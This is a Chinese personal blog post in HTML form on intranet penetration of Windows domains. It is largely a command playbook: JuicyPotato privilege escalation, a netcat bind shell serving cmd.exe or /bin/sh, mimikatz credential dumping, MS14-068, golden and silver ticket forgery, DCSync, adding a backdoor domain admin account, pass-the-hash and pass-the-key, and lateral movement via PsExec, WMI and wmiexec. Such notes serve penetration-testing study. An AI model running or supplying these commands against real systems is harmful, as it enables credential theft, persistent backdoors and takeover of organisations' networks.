@@ -1,0 +1,394 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>内网渗透探索 | Kenoeee</title><meta name="keywords" content="-内网渗透"><meta name="author" content="Kenoeee"><meta name="copyright" content="Kenoeee"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="内网渗透探索记录一下内网渗透的思路，写入马儿(这里有两个链接)连接后的操作，先用虚拟终端执行 123whoami 查看用户权限netstat -ano 查看开放端口systeminfo  这里可以注意一下两个内容，一个是域那里，可以看看有没有进行域渗透的可能；二是看修补程序那里，比如现在得到的信息是 123修补程序:         安装了 2 个修补程序。                  [0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透探索">
+<meta property="og:url" content="http://example.com/2022/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8E%A2%E7%B4%A2/index.html">
+<meta property="og:site_name" content="Kenoeee">
+<meta property="og:description" content="内网渗透探索记录一下内网渗透的思路，写入马儿(这里有两个链接)连接后的操作，先用虚拟终端执行 123whoami 查看用户权限netstat -ano 查看开放端口systeminfo  这里可以注意一下两个内容，一个是域那里，可以看看有没有进行域渗透的可能；二是看修补程序那里，比如现在得到的信息是 123修补程序:         安装了 2 个修补程序。                  [0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg">
+<meta property="article:published_time" content="2022-02-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-03-10T05:40:12.493Z">
+<meta property="article:author" content="Kenoeee">
+<meta property="article:tag" content="-内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8E%A2%E7%B4%A2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网渗透探索',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-10 13:40:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/20220128021634.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Kenoeee</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网渗透探索</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-28T16:00:00.000Z" title="发表于 2022-03-01 00:00:00">2022-03-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-10T05:40:12.493Z" title="更新于 2022-03-10 13:40:12">2022-03-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网渗透探索"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="内网渗透探索"><a href="#内网渗透探索" class="headerlink" title="内网渗透探索"></a>内网渗透探索</h1><p>记录一下内网渗透的思路，写入<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/195304.html">马</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/101227210/">儿</a>(这里有两个链接)连接后的操作，先用虚拟终端执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami 查看用户权限</span><br><span class="line">netstat -ano 查看开放端口</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<p>这里可以注意一下两个内容，一个是域那里，可以看看有没有进行域渗透的可能；二是看修补程序那里，比如现在得到的信息是</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">修补程序:         安装了 2 个修补程序。</span><br><span class="line">                  [01]: KB2999226</span><br><span class="line">                  [02]: KB976902</span><br></pre></td></tr></table></figure>
+
+<p>我们可以使用<a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">在线工具</a>去查看没有打的补丁，然后进行一个权的提，当然我们也可以直接使用一个工具</p>
+<h2 id="win的提权神器juicypotato-烂土豆"><a href="#win的提权神器juicypotato-烂土豆" class="headerlink" title="win的提权神器juicypotato(烂土豆)"></a>win的提权神器juicypotato(烂土豆)</h2><p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/releases">下载地址</a><a target="_blank" rel="noopener" href="http://app.myzaker.com/news/article.php?pk=5ba076fb77ac645c1d2e49c2">参考使用资料</a></p>
+<p>先执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>
+
+<p>如果开启 SeImpersonate 权限，juicypotato 的参数可以使用 -t t</p>
+<p>如果开启 SeAssignPrimaryToken 权限，juicypotato 的参数可以使用 -t u</p>
+<p>如果均开启，可以选择 -t *</p>
+<p>如果均未开启，那么无法提权</p>
+<p>这里顺便附上一些其它权限的提权<a target="_blank" rel="noopener" href="http://app.myzaker.com/news/article.php?pk=5b9f133c77ac64529d2def40">技巧</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -l 1111 -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有可用CLSID的<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">列表</a></p>
+<p>这里 -l后面跟一个系统没占用的端口就行</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/253721.html#">window提权</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/l3m0n/pentest_study">从0开始内网</a></p>
+<h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>先理解一下正向代理和反向代理</p>
+<blockquote>
+<p>正向代理：当客户端无法访问外部资源的时候（由于诸如墙这样的原因），可以通过一个正向代理去间接访问，所以客户端需要配置代理服务器的ip。正向代理是一个位于客户端和原始服务器之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。</p>
+<p>反向代理：客户端是无感知代理的存在，以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。</p>
+</blockquote>
+<p>而我们往往需要得到目标机器的通道，需要做到内网穿透，主要有以下方式</p>
+<ul>
+<li><p>反弹shell</p>
+<ul>
+<li>从目标机器能够反弹shell到攻击者的外网vps，攻击者通过反弹回来的shell能够很方便的对目标内网进行扫描，这就是反向代理的一种表现形式</li>
+</ul>
+</li>
+<li><p>端口转发</p>
+<ul>
+<li>通过指定一条专门的通道，能够对目标内网某台机器的某个具体端口进行访问，这种端口转发通常是一对一的</li>
+</ul>
+</li>
+<li><p>sock代理或者http代理</p>
+<ul>
+<li>开通一条专门的通道，并且提供http代理或者sock代理。攻击者可以通过配置响应的代理，直接访问目标内网任意机器，这就是正向代理的一种表现形式</li>
+</ul>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/320781.html">这里</a>有常见的内网穿透工具使用方法</p>
+<h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><blockquote>
+<p>客户端</p>
+<p>nc -lvp 8888 -e /bin/sh</p>
+<p>nc -lvp 8888 -e c:\windows\system32\cmd.exe</p>
+<p>服务端</p>
+<p>nc 服务端ip 8888</p>
+</blockquote>
+<h1 id="内网渗透-PTT-amp-PTH-amp-PTK利用"><a href="#内网渗透-PTT-amp-PTH-amp-PTK利用" class="headerlink" title="内网渗透-PTT&amp;PTH&amp;PTK利用"></a>内网渗透-PTT&amp;PTH&amp;PTK利用</h1><h2 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h2><h3 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h3><p>Kerberos认证是一种网络身份验证协议，在其中有三个主要角色Client、Server和KDC</p>
+<p><strong>KDC</strong>(Key Distribution Center)密钥分发中心，其中分为两个部分：</p>
+<ul>
+<li><p>Authentication Service(AS,身份验证服务)</p>
+</li>
+<li><p>Ticket Granting Service(TGS,票据授权服务)</p>
+</li>
+</ul>
+<p><strong>DC</strong>指的是Domain Controller，俗称的域控，<strong>AD</strong>指的是Active Directory，活动目录</p>
+<p>在DC中有一个特殊用户叫做 <strong>krbtgt</strong>,它是一个无法登录的账户，是在创建域的时候系统自动创建的，在整个kerberos认证中会多次用到它的Hash值去做验证</p>
+<p>AD会维护一个Account Database 它存储了域中所有用户的密码hash和白名单，只有账户密码都在白名单的Client才能申请到TGT</p>
+<h3 id="认证的流程"><a href="#认证的流程" class="headerlink" title="认证的流程"></a>认证的流程</h3><p>当Client想要访问Server上的某个服务时，需要先向AS证明自己的身份，验证通过后AS会分发一个TGT，随后Client再次向TGS证明自己的身份，验证通过后TGS会发放一个ST，最后Client向Server发起认证请求，这个过程分成三步</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/23a4e8978a30">详细细节</a></p>
+<p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个<br> Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,<strong>所以只要得到krbtgt的NTLM Hash</strong>，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
+<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>假设我们登录到了一个目标服务器的用户，可以尝试</p>
+<blockquote>
+<p>net config workstation 查看域名信息</p>
+<p>nltest /dsgetdc:域名     查看dc主机名</p>
+</blockquote>
+<p>上传mimikatz，用管理员权限打开</p>
+<blockquote>
+<p>log    </p>
+<p>privilege::debug    //提权</p>
+<p>sekurlsa::logonpasswords</p>
+</blockquote>
+<p>打开log可以得到一些用户的明文密码,用<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">ms14-068.exe</a></p>
+<blockquote>
+<p>ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控地址 -p 域成员密码</p>
+</blockquote>
+<p>这里的地址是ip，然后成功后会创建.ccache文件</p>
+<blockquote>
+<p>kerberos::purge //清空票据</p>
+<p>kerberos:list      //查看当前票据</p>
+<p>kerberos::ptc 票据地址   //导入凭证ccache</p>
+<p>klist    //查看票据 </p>
+</blockquote>
+<p>然后可以用net use进行登录 或者使用psexec wmi进行远程执行命令</p>
+<blockquote>
+<p>net use \\192.168.xxx.x\\c$</p>
+</blockquote>
+<h3 id="黄金票据Golden-ticket"><a href="#黄金票据Golden-ticket" class="headerlink" title="黄金票据Golden ticket"></a>黄金票据Golden ticket</h3><p>先登录域控</p>
+<blockquote>
+<p>lsadump::dcsync /domain:xxx.com /all /csv        //得到krbtgt的hash</p>
+<p>lsadump::dcsync /domain:xxx.com /user:krbtgt        //得到krbtgt的SID</p>
+<p>lsadump::dcsync /user:krbtgt //得到hash和SID</p>
+<p>lsadump::lsa /patch         //得到hash</p>
+</blockquote>
+<p>然后用普通账户的mimikatz生成金票</p>
+<blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::golden /admin:system /domain:xxx.com /sid:S-x-x-xxx /krbtgt:xxxx /ticket:ticket.kirbi&quot;</span> </span><br><span class="line"></span><br><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称    <span class="comment">//不是写入内存中的命令！</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>kerberos::list    //查看当前票据</p>
+<p>kerberos::purge    //清空票据</p>
+<p>kerberos::ptt ticket.kirbi //导入票据</p>
+<p>net user kkk 123123@qq /add /domain</p>
+<p>net group “domain admins” kkk /add /domain //创建域控账户</p>
+</blockquote>
+<p>可以用</p>
+<blockquote>
+<p>net time /domain //查看域名主机</p>
+<p>dir \xxx\c$</p>
+</blockquote>
+<p>所以获得黄金票据的条件有</p>
+<ul>
+<li>域名字</li>
+<li>域的SID</li>
+<li>域控的krbtgt账户的密码hash</li>
+<li>任意域用户名</li>
+</ul>
+<p>而获取krbtgt的hash需要域管理员的权限，所以进行黄金票据攻击，实际上是一种留后门的攻击方式，方便进行二次攻击</p>
+<h3 id="银票Silver-ticket"><a href="#银票Silver-ticket" class="headerlink" title="银票Silver ticket"></a>银票Silver ticket</h3><p>只需要Server用户的hash就可以伪造ST，但是这个伪造的票据只对部分服务起作用</p>
+<blockquote>
+<p>kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:<NTLM Hash> /user:&lt;用户名&gt; /ptt</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>Service Type</th>
+<th>Service Silver Tickets</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI</td>
+<td>HOST RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell Remoting</td>
+<td>HOST HTTP</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP operations includingMimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows Remote Server Administration Tools</td>
+<td>RPCSS LDAP CIFS</td>
+</tr>
+</tbody></table>
+<h2 id="PTH-Pass-The-Hash"><a href="#PTH-Pass-The-Hash" class="headerlink" title="PTH(Pass The Hash)"></a>PTH(Pass The Hash)</h2><p>pass the hash原理：</p>
+<ul>
+<li>在Windows系统中，通常会使用NTLM身份认证</li>
+<li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li>
+<li>hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash</li>
+<li>如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)</li>
+</ul>
+<p>这类攻击适用于：</p>
+<ul>
+<li>域/工作组环境</li>
+<li>可以获得hash，但是条件不允许对hash爆破</li>
+<li>内网中存在和当前机器相同的密码</li>
+</ul>
+<p>先用mimikatz</p>
+<blockquote>
+<p>privilege::debug</p>
+<p>sekurlsa::logonpasswords</p>
+<p>sekurlsa::pth /user:administrator /domain:xxx /ntlm:xxx</p>
+</blockquote>
+<p>成功后会弹出一个cmd</p>
+<h2 id="PTK-Pass-The-Key"><a href="#PTK-Pass-The-Key" class="headerlink" title="PTK(Pass The Key)"></a>PTK(Pass The Key)</h2><p>针对于pth打了补丁的情况</p>
+<blockquote>
+<p>privilege::debug</p>
+<p>sekurlsa::ekeys</p>
+<p>sekurlsa::pth /user:xxx /domain:xxx /aes256:xxx</p>
+</blockquote>
+<p>如果拒绝访问的话尝试安装<code>kb2871997补丁</code></p>
+<blockquote>
+<p> 1.pth（lm 或 ntlm）：没打补丁用户都可以连接，打了补丁只能 administrator 连接<br> 2.ptk（ekeys aes256）：打了补丁才能用户都可以连接，采用 aes256 连接<br> <a target="_blank" rel="noopener" href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a><br> 3.#PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的，这里就介绍三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。</p>
+</blockquote>
+<blockquote>
+<p>MS14-068 基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)<br>其中 Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术<br>（1）MS14-068 造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</p>
+</blockquote>
+<h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><h2 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">下载地址</a></p>
+<ul>
+<li>psexec远程运行需要远程计算机启用文件和打印共享且默认的Admin$共享映射到C:windows目录。</li>
+<li>psexec建立连接之后目标机器上会被安装一个“PSEXESVC”服务。但是psexec安全退出之后这个服务会自动删除（在命令行下使用exit命令退出）。</li>
+</ul>
+<p>由于是官方软件，所以不会被杀，并且可能服务器管理员为了方便就已经安装了该软件，但是创建服务有日志，有可能会被溯源</p>
+<p>条件</p>
+<blockquote>
+<ul>
+<li>需要目标机器开启了ADMIN$共享(默认开启)</li>
+<li>建立了IPC连接，可以不输入账号密码连接到CMD窗口</li>
+</ul>
+</blockquote>
+<p>首先登录到域内的普通用户</p>
+<blockquote>
+<p>net view /domain //查看域名</p>
+<p>net view /domain:xxxx         //查看域</p>
+<p>nslookup \\xx    //定位ip</p>
+</blockquote>
+<p>IPC$（Internet Process Connection）是“进程间通信”的简称，其本质是一个共享的“命名管道”资源，主要的作用是为了让进程间通信而开放一个命名管道，通过提供可信任的用户名和口令，从而到达连接双方可以建立一个安全的通道并以此进行加密数据交换的功能，最终显现出来的效果就是能够实现对远程计算机的访问。</p>
+<p><code>其实说白了IPC$有点类似于共享目录，但功能比他多得多。通过IPC$与目标机建立连接，不仅可以访问目标机器中的文件，进行上传、下载，还可以在目标机上运行命令。使用下面的命令就可以很轻松地创建一个IPC$连接了。</code></p>
+<p><strong>开启条件</strong></p>
+<ul>
+<li>目标机开启了139和445端口</li>
+<li>目标主机管理员开启了ipc$默认共享</li>
+<li>知道目标机的账号密码</li>
+</ul>
+<blockquote>
+<p> Net use \&lt;目标机IP&gt;\ipc$ “password” /user:”username”</p>
+</blockquote>
+<p>若无IPC</p>
+<blockquote>
+<p>psexec.exe \\192.168.xxx.xxx -u xxx -p xxx</p>
+</blockquote>
+<p>若有IPC,则不需要验证</p>
+<blockquote>
+<p>psexec.exe -accepteula \\192.168.xxx.xxx -s cmd.exe</p>
+</blockquote>
+<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><blockquote>
+<p>WMI是“Windows Management Instrumentation”的缩写，WMI是从Windows98开始，系统自带的一系列工具集。WMI提供了/node选项，可以通过135端口上的RPC服务进行远程访问，或者执行远程命令</p>
+</blockquote>
+<p><code>WMI是“Windows Management Instrumentation”的缩写，WMI是从Windows98开始，系统自带的一系列工具集。WMI提供了/node选项，可以通过135端口上的RPC服务进行远程访问，或者执行远程命令</code></p>
+<p>但是wmic是没法回显的，只能把结果保存在本地然后用type读取</p>
+<blockquote>
+<p>wmic /node:192.168.183.130/user:administrator /password:Liu78963 process call create “cmd.exe /c&lt;命令&gt; &gt; C:\result.txt”</p>
+<p>Type \192.168.x.xx\c$\result.txt</p>
+</blockquote>
+<p>也可以用py脚本直接获得交互shell</p>
+<blockquote>
+<p>python3 wmiexec.py administrator:域名@username@ip</p>
+<p>python3 wmiexec.py -hashes lmhash:nthash 域名/username@ip</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Kenoeee</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8E%A2%E7%B4%A2/">http://example.com/2022/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8E%A2%E7%B4%A2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Kenoeee</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">-内网渗透</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/02/15/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/8_高清放大.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTTP走私攻击</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/20220128021634.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Kenoeee</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8E%A2%E7%B4%A2"><span class="toc-number">1.</span> <span class="toc-text">内网渗透探索</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#win%E7%9A%84%E6%8F%90%E6%9D%83%E7%A5%9E%E5%99%A8juicypotato-%E7%83%82%E5%9C%9F%E8%B1%86"><span class="toc-number">1.1.</span> <span class="toc-text">win的提权神器juicypotato(烂土豆)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">内网代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netcat"><span class="toc-number">1.2.1.</span> <span class="toc-text">netcat</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-PTT-amp-PTH-amp-PTK%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">内网渗透-PTT&amp;PTH&amp;PTK利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PTT"><span class="toc-number">2.1.</span> <span class="toc-text">PTT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81"><span class="toc-number">2.1.1.</span> <span class="toc-text">Kerberos认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.2.</span> <span class="toc-text">认证的流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">2.1.3.</span> <span class="toc-text">实操</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AEGolden-ticket"><span class="toc-number">2.1.4.</span> <span 